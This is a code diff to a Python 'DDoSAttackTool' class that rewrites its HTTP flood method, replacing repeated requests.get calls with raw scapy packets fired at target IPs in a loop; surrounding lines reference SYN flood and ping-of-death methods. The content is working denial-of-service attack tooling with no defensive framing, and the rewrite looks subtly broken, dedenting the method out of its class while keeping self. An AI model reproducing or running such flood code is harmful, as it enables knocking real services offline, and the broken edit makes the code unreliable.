@@ -196,26 +196,30 @@ class DDoSAttackTool:
         except Exception as e:
             print("An error occurred during the SYN flood attack:", e)
 
-    def http_flood_attack(self, target_ips, port, num_packets, burst_interval):
-        try:
-            urls = [f"http://{target}:{port}/" for target in target_ips]
-            headers = {
-                "User-Agent":
-                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
-            }
+def http_flood_attack(self, target_ips, port, num_packets, burst_interval):
+    try:
+        urls = [f"http://{target}:{port}/" for target in target_ips]
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
+        }
 
-            with progressbar.ProgressBar(max_value=num_packets) as bar:
-                for url in urls:
-                    for i in range(num_packets):
-                        requests.get(url, headers=headers)
-                        self.attack_num += 1
-                        packet_size = len(requests.get(url, headers=headers).content)
-                        self.total_bytes_sent += packet_size
-                        print(f"Sent {self.attack_num} HTTP request to {url}")
-                        time.sleep(burst_interval)
-                        bar.update(i + 1)
-        except Exception as e:
-            print("An error occurred during the HTTP flood attack:", e)
+        with progressbar.ProgressBar(max_value=num_packets) as bar:
+            for url in urls:
+                for i in range(num_packets):
+                    # Craft HTTP request packet
+                    packet = IP(dst=target_ips[0])/TCP(dport=port)/Raw(f"GET {url} HTTP/1.1\r\nHost: {target_ips[0]}\r\nUser-Agent: {headers['User-Agent']}\r\n\r\n")
+                    
+                    # Send the crafted packet
+                    send(packet, verbose=False)
+                    
+                    self.attack_num += 1
+                    self.total_bytes_sent += len(packet)
+                    print(f"Sent {self.attack_num} HTTP request to {url}")
+                    time.sleep(burst_interval)
+                    bar.update(i + 1)
+    except Exception as e:
+        print("An error occurred during the HTTP flood attack:", e)
+
 
     def ping_of_death_attack(self, target_ips, num_packets, burst_interval):
         try:
